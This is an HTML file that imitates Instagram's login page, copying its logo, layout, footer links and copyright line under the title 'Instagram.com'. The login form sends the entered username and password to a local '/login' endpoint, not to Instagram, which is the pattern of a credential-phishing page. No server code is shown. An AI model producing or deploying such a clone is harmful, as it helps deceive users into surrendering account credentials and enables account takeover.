<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="icons/InstagramIcon.png" type="image/png">
    <title>Instagram.com</title>
    <link rel="stylesheet" href="/styles/style.css">
</head>
<body>
    <div class="user-credential-div">
        <div class="box">
            <img class="instagram-logo" src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png"></img>
            <form action="/login" method="POST">
                <div>
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or Email" class="user-email-place"><br><br>
                </div>
                <div>
                    <input type="password" id="password" name="password" placeholder="Password" class="user-password-place"><br><br>
                </div>
                <div>
                    <button type="submit" class="login-button">
                        <span>Log&nbsp;In</span>
                    </button>
                </div>
                <div class="or-section">
                    <div class="or-divider"></div>
                    <div class="or-text">OR</div>
                    <div class="or-divider"></div>
                </div>
                <a target="_blank" href="https://www.facebook.com/">
                    <div class="facebook-section">
                        <img width="26" height="26" src="https://img.icons8.com/color/48/facebook.png" alt="facebook"/>
                        <p class="facebook-login-text">Log in with Facebook</p>
                    </div>
                </a>
                <a href="https://www.instagram.com/accounts/password/reset/">
                    <h5>
                        <p class="forgot-password-text">Forgot password?</p>
                    </h5>
                </a>
            </form>
        </div>
    </div>
    <div class="sign-up-div">
        <p class="sign-up-text">Don't have an account? <span><a class="bl-text" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span></p>
    </div>
    <div class="get-app">
        <p class="get-app-text">
            Get the app.
        </p>
        <div class="app">
            <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DC44D231A-101C-4AFA-B4A6-F5909E0BCA2B%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1">
                <img class="app-google" src="icons/google.png">
            </a>
            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C2160%2C1368">
                <img class="app-microsoft" src="icons/microsoft.png">
            </a>
        </div>
        <footer>
            <h5>
                <div class="footer">
                    <p class="first-line">
                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/">
                            <span>Meta</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/">
                            <span>About</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/en_US/blog">
                            <span>Blog</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/about-us/careers">
                            <span>Jobs</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/">
                            <span>Help</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://developers.facebook.com/docs/instagram">
                            <span>API</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://privacycenter.instagram.com/">
                            <span>Privacy</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/581066165581870/">
                            <span>Terms</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/directory/profiles/">
                            <span>Top Accounts</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/explore/locations/">
                            <span>Locations</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/web/lite/">
                            <span>Instagram Lite</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://www.threads.net/">
                            <span>Threads</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://www.facebook.com/help/instagram/261704639352628">
                            <span>Contact Uploading & Non-Users</span>
                        </a>
                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/technologies/meta-verified/">
                            <span>Meta Verified</span>
                        </a>
                    </p>
                    <p class="second-line">
                        <span class="s-line-elements">English <img width="12" height="12" src="https://img.icons8.com/ios-glyphs/30/expand-arrow--v1.png" alt="expand-arrow--v1" /></span>
                        <span class="s-line-elements">Â© 2023 Instagram from Meta</span>
                    </p>
                </div>
            </h5>
        </footer>
    </div>
</body>
</html>
